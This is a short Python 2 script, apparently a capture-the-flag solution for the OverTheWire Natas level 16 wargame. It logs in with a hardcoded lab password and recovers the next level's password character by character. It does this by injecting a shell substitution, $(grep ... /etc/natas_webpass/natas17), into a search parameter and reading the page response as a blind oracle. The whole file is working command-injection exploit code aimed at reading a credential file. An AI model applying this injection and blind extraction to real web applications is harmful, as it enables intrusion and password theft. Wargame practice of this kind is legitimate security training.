#!/usr/bin/env python

# Chris Lapa
# https://github.com/GusBricker/ctf
# GNU General Public License v2.0

import requests
import time

session = requests.Session()
session.auth = ("natas16","WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")

LENGTH=32
START_CHAR='0'
END_CHAR='z'
word="meowing"
password=list()
for i in range(1,LENGTH+1, 1):

    char = START_CHAR
    password.append(char)
    while char != END_CHAR:
        if str.isalnum(char):
            password[i - 1] = char
            str_password = "".join(password)
            print "{0}".format(str_password),
            url="""http://natas16.natas.labs.overthewire.org/index.php?debug&needle=$(grep ^{0} /etc/natas_webpass/natas17){1}&submit=Search""".format(str_password, word)
            r = session.get(url)

            print " | {0}".format(r.status_code)
            if word not in r.text:
                break

        char = chr(ord(char) + 1)

